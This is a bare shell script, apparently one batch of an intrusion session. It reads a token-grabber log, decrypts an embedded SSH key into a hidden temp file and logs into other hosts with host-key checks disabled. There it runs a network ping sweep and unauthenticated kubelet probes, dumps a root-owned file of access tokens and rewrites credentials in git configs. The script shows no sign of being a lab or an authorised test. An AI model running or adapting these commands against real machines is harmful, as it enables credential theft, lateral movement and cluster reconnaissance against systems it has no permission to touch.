echo "=== tokgrab ==="
head -c 800 /root/snoop/hits.log; echo
head -40 /root/snoop/tokgrab.sh 2>/dev/null | head -20
echo "=== k221 delivery ==="
P=$(sha256sum /root/.rxk | awk '{print $1}')
cat > /tmp/.k221.b64 <<'K64'
U2FsdGVkX19LkXINo9e31msQCD0/5eugkAzFTlZs+UDO8h5ws9YdNoRBSsqL/X7ReI0SxfYMzVsZ
afPwpwIwepW92lc3GS/4myg0s4o0G7cqZusVH5qWJlBDuXSbNtoZrulUkwEJHxJyvKNUqPDhaXO8
xsEuf21DgZFLqZX//j4EgvXI8CqGSp97UZ/1VW1pWpmmShsPbMZF3R2b0en6uVEZ9e3zug5Jep3t
1kXBoTwahJXpBLNaIK16ZEOpl/pquY5jH3Z05VjHLJN/N/WBlBcYorkRZuVh+2YrOy6WuqnsBl8/
CcKDhyVIfJabXh/wSKvJHZ+WbF4kK6IjmYBAYkVXZYEdMKf+qW8Et3KxiCCDrq5XmiVZqcApl5hh
Z5fwTQrfJvUfCWFwM3R62aiPRno5rZNATcJSnUREMwryeQLvWXOftVGaPGzyM9bBRRwyLTjRIfsw
INA5eNIJXbYUQdqXnNJ/nUktZvpJ+XeWxD4kA3glEBxckYV9xQeCyjC/+CgzN6+27dCpGU8dXobB
mha7baa7XJvSM/f2GtxQ8KVVqrzOusBLw5tj8tPxXihJN3hv1Ifdns29Smk6g7ZuIQ==
K64
openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:$P -in /tmp/.k221.b64 -out /tmp/.k221 2>/dev/null && chmod 600 /tmp/.k221 && head -1 /tmp/.k221 || echo "DECRYPT-FAIL"
echo "=== 221 recon ==="
cat > /tmp/recon221.sh <<'RSH'
#!/bin/bash
echo "=== id ==="; id; sudo -n true 2>&1 && echo SUDO-OK
echo "=== ip addr ==="; ip -brief addr
echo "=== ip neigh ==="; ip neigh
echo "=== ping-sweep ==="; for i in $(seq 1 254); do (ping -c1 -W1 85.234.79.$i >/dev/null 2>&1 && echo "85.234.79.$i up") & done; wait
echo "=== neigh after ==="; ip neigh | grep -v FAILED
echo "=== kubelet probes ==="
for ip in 31 87 103 109 184 233; do
  for path in /healthz /pods; do
    code=$(curl -sk --max-time 4 "https://85.234.79.$ip:10250$path" -o /tmp/kube-$ip$(echo $path|tr / _) -w "%{http_code}")
    echo "  85.234.79.$ip:10250$path -> $code ($(wc -c < /tmp/kube-$ip$(echo $path|tr / _) 2>/dev/null) bytes)"
  done
done
echo "=== pods bodies (first 300 chars each) ==="
for ip in 31 87 103 109 184 233; do echo "-- $ip --"; head -c 300 /tmp/kube-$ip_pods 2>/dev/null; echo; done
echo "=== tailnet ==="; (command -v tailscale && tailscale status 2>&1 | head -8); ip link show tailscale0 2>&1 | head -2
echo "=== listening ==="; ss -tlnp 2>/dev/null | head -25
echo "=== docker ==="; docker ps 2>/dev/null | head -12
echo "=== homes ==="; ls /home/
RSH
chmod +x /tmp/recon221.sh
if [ -s /tmp/.k221 ]; then
  timeout 100 ssh -i /tmp/.k221 -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 dev-24-sudo@85.234.79.221 'bash -s' < /tmp/recon221.sh 2>&1 | head -120
else
  echo "no key, skip"
fi
echo "=== pats root ==="
timeout 60 ssh -o StrictHostKeyChecking=no -i /root/.rxk radix-irprobe@85.234.79.62 'sudo bash -s' <<'PAYLOAD'
cat /root/pats.txt
echo "=== githist scrub ==="
for c in /opt/githist/rx/*/.git/config; do
  [ -f "$c" ] || continue
  before=$(grep -cE "url = .*//[^/]*@" "$c" 2>/dev/null)
  sed -i -E 's#(url = https?://)[^/@]+@#\1#' "$c" 2>/dev/null
  after=$(grep -cE "url = .*//[^/]*@" "$c" 2>/dev/null)
  echo "$c cred-urls:$before->$after"
done
PAYLOAD
echo "=== B13DONE ==="
